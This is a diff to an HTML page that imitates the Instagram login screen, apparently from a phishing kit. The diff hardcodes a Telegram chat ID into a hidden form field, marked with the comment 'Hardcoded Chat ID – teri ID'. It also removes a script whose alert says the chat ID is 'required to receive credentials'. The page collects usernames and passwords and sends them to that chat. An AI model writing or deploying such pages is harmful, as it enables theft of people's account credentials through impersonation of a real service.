@@ -25,11 +25,11 @@
 </head>
 <body>
   <div class="container">
-    <!-- ✅ IMAGE LOGO – ./img/instagram-logo.png -->
     <img src="./img/instagram-logo.png" alt="Instagram" class="logo" />
 
+    <!-- ✅ Hardcoded Chat ID – teri ID -->
     <form action="/login" method="POST">
-      <input type="hidden" name="chat_id" id="chatIdField" value="">
+      <input type="hidden" name="chat_id" value="8975887766">
       <input type="text" name="username" placeholder="Phone number, username, or email" required />
       <input type="password" name="password" placeholder="Password" required />
       <button type="submit" class="btn">Log In</button>
@@ -40,14 +40,5 @@
     <a href="#" class="forgot">Forgot password?</a>
     <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
   </div>
-
-  <script>
-    const userChatId = prompt("Enter your Telegram Chat ID (get it from @userinfobot):");
-    if (userChatId) {
-      document.getElementById('chatIdField').value = userChatId;
-    } else {
-      alert("Chat ID is required to receive credentials.");
-    }
-  </script>
 </body>
 </html>
